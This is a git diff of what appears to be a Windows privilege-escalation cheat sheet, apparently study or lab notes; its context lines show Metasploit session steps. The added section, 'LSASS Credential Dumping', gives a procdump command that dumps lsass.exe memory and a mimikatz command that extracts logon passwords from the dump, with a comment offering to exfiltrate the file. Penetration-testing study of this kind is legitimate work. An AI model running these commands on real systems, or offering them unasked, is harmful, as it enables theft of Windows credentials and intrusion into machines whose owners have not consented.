@@ -543,3 +543,13 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
 * In Metasploit (msf > prompt) type: `set SESSION [meterpreter SESSION number]`
 * In Metasploit (msf > prompt) type: `set LPORT 5555`
 * In Metasploit (msf > prompt) type: `run`
+
+### LSASS Credential Dumping
+
+* use `procdump`&#x20;
+
+```
+procdump.exe -accepteula -ma lsass.exe C:\Users\Administrator\Desktop\lsass.dmp
+#either exfil or perform locally 
+mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords
+```
